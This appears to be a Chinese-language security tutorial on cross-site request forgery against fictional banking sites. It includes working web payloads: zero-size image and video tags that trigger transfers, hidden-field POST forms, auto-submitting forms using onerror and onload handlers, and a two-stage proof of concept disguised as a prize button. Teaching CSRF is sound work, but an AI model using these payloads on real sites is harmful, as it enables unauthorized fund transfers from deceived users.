## GET 查询参数篡改

> 作为顶级导航的 GET 请求将在默认 SameSite Cookie 设置下携带 cookie

让我们考虑 CSRF 攻击最基本的形式——通过超链接进行参数篡改（传播一个恶意链接，点击后，将以已认证用户的名义执行改变状态的 HTTP GET 请求）。Web 上的大多数超链接对应于 HTTP GET 请求。最常见的超链接就是嵌入在 HTML 片段中的 `<a href="https://my-site.com"></a>`。

HTTP GET 请求的结构简单且一致：

```http
GET /resource-url?key=value HTTP/1.1
Host: www.mega-bank.com
```

每个 HTTP GET 请求都包括 HTTP 方法（GET），后跟资源 URL，然后是一组可选的查询参数。查询参数的起始由 `?` 表示，一直持续到遇到空格。接着是 HTTP 规范版本，下一行是资源 URL 所在的主机。

当 Web 服务器收到此请求时，它会被路由到适当的处理程序类，该类将接收查询参数以及一些附加信息，以识别发起请求的用户、他们请求时使用的浏览器类型，以及他们期望返回的数据格式。

让我们看一个例子，使这个概念更具体。第一个例子是一个服务端路由类，它基于 ExpressJS（最流行的基于 Node.js 的 Web 服务器软件）编写：

```javascript
/*
 * 一个示例路由。
 *
 * 将 HTTP 请求提供的查询返回给请求者。
 * 如果未提供查询，则返回错误。
 */
app.get('/account', function(req, res) {
  if (!req.query) { return res.sendStatus(400); }
  return res.json(req.query);
});
```

这是一个极其简单的路由，只做几件事：

- 仅接受对 `/account` 的 HTTP GET 请求
- 如果未提供查询参数，返回 HTTP 400 错误
- 如果提供了查询参数，以 JSON 格式将查询参数反射回发送方

让我们从 Web 浏览器向此端点发起请求：

```javascript
/*
 * 生成一个不带查询的新 HTTP GET 请求。
 *
 * 这将失败并返回错误。
 */
const xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  console.log(xhr.responseText);
}
xhr.open('GET', 'https://www.mega-bank.com/account', true);
xhr.send();
```

这里，我们从浏览器向服务器发起一个 HTTP GET 请求，由于我们没有提供任何查询参数，它将返回 400 错误。我们可以添加查询参数以获得更有趣的结果：

```javascript
/*
 * 生成一个带查询的新 HTTP GET 请求。
 *
 * 这将成功，并且查询将在响应中被反射回来。
 */
const xhr = new XMLHttpRequest();
const params = 'id=12345';
xhr.onreadystatechange = function() {
  console.log(xhr.responseText);
}
xhr.open('GET', `https://www.mega-bank.com/account?${params}`, true);
xhr.send();
```

发起此请求后不久，将返回一个包含以下内容的响应：

```json
{
  id: 12345
}
```

如果您在浏览器中检查网络请求，它还会包含 HTTP 200 状态码。

理解这些请求的流程对于发现和利用 CSRF 漏洞至关重要。让我们回溯一下，再次讨论 CSRF。

CSRF 攻击的两个主要标识是：

- 权限提升
- 发起请求的用户账户通常不知道它发生了（这是一种隐蔽攻击）

大多数遵循 HTTP 规范的 CRUD（创建、读取、更新、删除）Web 应用会使用多种 HTTP 动词，而 GET 只是其中之一。不幸的是，GET 请求是任何请求中最不安全的，也是构造 CSRF 攻击最简单的方式之一。

我们分析的最后一个 GET 端点反射了数据，但重要的是它确实读取了我们发送的查询参数。浏览器中的 URL 地址栏会发起 HTTP GET 请求，浏览器或手机中的 `<a></a>` 链接也是如此。

此外，当我们在互联网上点击链接时，我们很少评估来源以查看链接将我们带到何处。这个链接：

```html
<a href="https://www.my-website.com?id=123">My Website</a>
```

在浏览器中会显示为 “My Website”。大多数用户不会知道有一个参数作为标识符附加到链接上。任何点击该链接的用户都会从他们的浏览器发起一个请求，向关联服务器发送一个查询参数。

让我们想象我们虚构的银行网站 MegaBank 使用了带参数的 GET 请求。看看这个服务端路由：

```javascript
import session from '../authentication/session';
import transferFunds from '../banking/transfers';

/*
 * 将资金从已认证用户的银行账户转移到已认证用户选择的银行账户。
 *
 * 已认证用户可以选择要转账的金额。
 */
app.get('/transfer', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }
  if (!req.query.to_user) { return res.sendStatus(400); }
  if (!req.query.amount) { return res.sendStatus(400); }

  transferFunds(session.currentUser, req.query.to_user, req.query.amount,
    (error) => {
      if (error) { return res.sendStatus(400); }
      return res.json({
        operation: 'transfer',
        amount: req.query.amount,
        from: session.currentUser,
        to: req.query.to_user,
        status: 'complete'
      });
    }
  );
});
```

对于未经训练的眼睛来说，这个路由看起来很简单。它检查用户是否拥有正确的权限，并检查是否指定了转账目标用户。由于用户拥有正确的权限，考虑到用户必须经过身份验证才能发起此请求（它假定请求是代表请求用户发起的），指定的金额应该是准确的。同样，我们假设转账是转给正确的人。不幸的是，因为这是使用 HTTP GET 请求完成的，一个指向此特定路由的超链接可以很容易地被构造并发送给已认证用户。

涉及 HTTP GET 参数篡改的 CSRF 攻击通常按以下步骤进行：

1. 黑客发现 Web 服务器使用 HTTP GET 参数来修改其逻辑流程（在本例中，确定银行转账的金额和目标）。
2. 黑客使用这些参数构造一个 URL 字符串：`<a href="https://www.mega-bank.com/transfer?to_user=<黑客的账户>&amount=10000">click me</a>`。
3. 黑客制定分发策略：通常要么是定向攻击（谁最有可能已登录并拥有正确数量的资金？），要么是批量攻击（如何在被检测到之前的短时间内尽可能多地攻击用户？）。

这些攻击通常通过电子邮件或社交媒体分发。由于分发容易，其影响对公司可能是毁灭性的。黑客甚至曾发起网络广告活动，以将他们的链接尽可能多地传播到用户手中。

### 无需用户交互的 GET CSRF 载荷

> 仅在网站的 SameSite Cookie 设置为 none 时

由于浏览器中的默认 HTTP 请求是 GET 请求，许多接受 URL 参数的 HTML 标签在被交互或加载到 DOM 时会自动发起 GET 请求。因此，GET 请求最容易通过 CSRF 攻击。

在之前的示例中，我们使用了超链接 `<a></a>` 标签来诱骗用户在其自己的浏览器中执行 GET 请求。或者，我们也可以构造一个图像来做同样的事情：

```html
<!-- 与链接不同，图像在加载到 DOM 时立即执行 HTTP GET 请求。这意味着它不需要加载网页的用户进行任何交互。 -->
<img src="https://www.mega-bank.com/transfer?to_user=<黑客的账户>&amount=10000" width="0" height="0" border="0">
```

当浏览器检测到图像标签时，浏览器会向 `<img>` 标签中包含的 `src` 端点发起 GET 请求。这就是图像对象加载到浏览器的方式。因此，一个图像标签（在这种情况下，是一个不可见的 0×0 像素图像）可以用来在无需任何用户交互的情况下发起 CSRF。

同样，大多数其他允许 URL 参数的 HTML 标签也可以用来发起恶意 GET 请求。考虑 HTML5 的 `<video></video>` 标签：

```html
<!-- 视频通常立即加载到 DOM 中，具体取决于浏览器的配置。某些移动浏览器直到元素被交互时才会加载。 -->
<video width="1280" height="720" controls>
  <source src="https://www.mega-bank.com/transfer?to_user=<黑客的账户>&amount=10000" type="video/mp4">
</video>
```

上述视频的功能与使用的图像标签相同。大多数此类从服务器请求数据的标签都可以用来对不知情的最终用户发起 CSRF 攻击：
- `<iframe src`
- `<script src`
- `<link href`

## 针对 POST 端点的 CSRF

> 作为顶级导航的 POST 请求将在默认 SameSite Cookie 设置下携带 cookie

CSRF 攻击通常针对 GET 端点，因为通过超链接、图像或其他自动发起 HTTP GET 请求的 HTML 标签来分发 CSRF 要容易得多。然而，针对 POST、PUT 或 DELETE 端点发送 CSRF 载荷仍然是可能的。传递 POST 载荷需要更多工作，并且需要一些强制性用户交互。

通常，通过 POST 请求传递的 CSRF 攻击是通过浏览器表单创建的，因为 `<form></form>` 对象是少数可以在不需要任何脚本的情况下发起 POST 请求的 HTML 对象之一：

```html
<form action="https://www.mega-bank.com/transfer" method="POST">
  <input type="hidden" name="to_user" value="hacker">
  <input type="hidden" name="amount" value="10000">
  <input type="submit" value="Submit">
</form>
```

在通过 POST 表单进行 CSRF 的情况下，我们可以利用表单输入上的 “hidden” 类型属性来植入不会在浏览器中渲染的数据。

除了设计 CSRF 载荷所需的隐藏字段外，我们还可以通过提供合法的表单字段来进一步操纵用户：

```html
<form action="https://www.mega-bank.com/transfer" method="POST">
  <input type="hidden" name="to_user" value="hacker">
  <input type="hidden" name="amount" value="10000">
  <input type="text" name="username" value="username">
  <input type="password" name="password" value="password">
  <input type="submit" value="Submit">
</form>
```

在这个例子中，用户将看到一个登录表单——也许是一个合法网站的登录表单。但是当表单被填写并提交时，实际上会向 MegaBank 发起请求——不会发起任何登录尝试。

这是一个示例，说明看起来合法的 HTML 组件如何被用来发送请求，利用用户在浏览器中的当前应用状态。在这种情况下，用户已登录 MegaBank，尽管他们正在与一个完全不同的网站交互，但我们能够利用他们在 MegaBank 中的当前会话，代表他们执行特权操作。

这种技术也可以用来代表有权访问内部网络的用户发起请求。表单的创建者不能向内部网络上的服务器发起请求，但如果一个位于内部网络的用户填写并提交了表单，由于目标用户拥有更高的网络访问权限，该请求将针对内部服务器发出。

自然，这种类型的 CSRF（POST）比通过 `<a></a>` 标签植入 CSRF GET 请求更复杂——但有时您必须对 POST 端点发起特权请求，这时表单是成功发起攻击的最简单方式。

值得一提的是，有时应用程序也会将 POST 方法表单通过 GET 方法提交；在这种情况下，可以将 POST 请求转换为 GET。

### 无需用户交互的 POST CSRF 有效载荷

> 作为顶级导航的 POST 请求将在默认 SameSite Cookie 设置下携带 cookie

前面示例中提到的有效载荷需要用户交互，因为用户必须点击提交按钮才能执行请求。然而，有几种方法可以在后台提交表单。一个例子是使用 JavaScript 中的 `submit()` 函数。我们来看一下实际效果：

**示例 1：使用 document.forms**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST">
    <input type="hidden" name="to_account" value="123456789" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
</form>
<script>
    document.forms[0].submit();
</script>
```

在此示例中，`document.forms[0]` 引用网页上的第一个表单元素，后面跟 `submit()` 函数，该函数触发表单提交。

还有几种不涉及 script 标签的替代方法。例如，可以使用 img 标签加载不存在的图像，从而触发错误。这与 `onerror` 事件处理程序结合使用，可用于触发表单提交。

**示例 2：替代执行方式**
```html
<form action="www.vulnerablebank.com/transfer.php" method="POST" id="transferForm">
    <input type="hidden" name="to_account" value="8654754" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
    <img src=x onerror="document.getElementById('transferForm').submit();" />
</form>
```

其他几个 HTML 元素可以使用 `onload` 或 `onerror` 事件处理程序来自动提交表单，无需用户交互。

**有效载荷**
```html
<svg/onload="document.getElementById('transferForm').submit();">
<iframe onload="document.getElementById('transferForm').submit();"></iframe>
<body onload="document.getElementById('transferForm').submit();" />
<video src="x" onerror="document.getElementById('transferForm').submit();"></video>
```

## 利用多阶段 CSRF

为涉及单个请求的 CSRF 攻击创建 POC 相对简单。然而，当涉及多个请求时，过程变得复杂，特别是对于状态更改操作，如用户创建/删除或资金转移。

尽管复杂，但有一条规则成立：只要多个阶段中涉及的参数是可预测且一致的，就有可能实施 CSRF 攻击。让我们以 `vulnerablebank` 场景为例，该场景具有多个资金转移阶段。

在我们的场景中，第一阶段涉及提交账户号、金额和货币等详细信息。以下是第一个请求的样子：

**请求**
```http
POST /transfer.php HTTP/1.1
Host: vulnerablebank.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://vulnerablebank.com
Connection: close
Referer: http://vulnerablebank.com/transfer.php
Cookie: PHPSESSID=99cbdv5bo99hqb42geaq4hfgh9
Upgrade-Insecure-Requests: 1

to_account=098855455&amount=1000&currency=usd
```

提交这些详细信息后，会出现一个确认表单，只有点击“确认”按钮后，交易才会执行。以下是请求的样子：

**请求**
```http
POST /confirm.php HTTP/1.1
Host: vulnerablebank.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://vulnerablebank.com/confirm.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://vulnerablebank.com
Connection: close
Cookie: PHPSESSID=99cbdv5bo99hqb42geaq4hfgh9
Upgrade-Insecure-Requests: 1
```

基于此，我们可以创建一个 CSRF POC 来模拟转账和确认的两步过程。

**POC**
```html
<h1>Click the button to win a prize!</h1>
<button onclick="winFunc();">Click here to win Prize!</button>

<form id="form1" action="http://vulnerablebank.com/transfer.php" method="POST" target="hiddenIframe">
    <input type="hidden" name="to_account" value="098855455" />
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="currency" value="usd" />
</form>

<form id="form2" action="http://vulnerablebank.com/confirm.php" method="POST" target="hiddenIframe">
</form>

<iframe name="hiddenIframe" style="display:none;"></iframe>

<script>
function winFunc() {
    // Step 1: Initiate the transfer
    document.getElementById('form1').submit();
    // Delay before sending the second request
    setTimeout(function() {
        // Step 2: Confirm the transfer
        document.getElementById('form2').submit();
    }, 3000);
}
</script>
```
- 设置表单提交的上下文为子框架，以隐藏当前行为（修改默认的当前上下文跳转）

POC 被伪装成一个无害的按钮，声称用户会赢得奖品。然而，一旦点击按钮，它会发起两个 POST 请求，分别到 `transfer.php` 和 `confirm.php`。

包含攻击有效载荷的表单 `form1` 和 `form2` 被设置为 `display: none`，并且其目标为隐藏的 iframe，确保受害者在点击按钮时不会注意到任何可疑内容。

`winFunc()` 函数首先提交表单以发起转账，然后等待三秒再提交第二个表单以确认转账。此延迟最小化了在目标网站上发起和确认交易之间可能出现的时间差。此时间是随意的；但可以根据网站实际操作的时间进行调整。

值得注意的是，相同的多阶段 POC 也可以通过 XHR 和 Fetch API 完成；但是，这些方法将受制于 SOP。在考虑在 CSRF 攻击中使用这些方法时，这是一个关键细节。
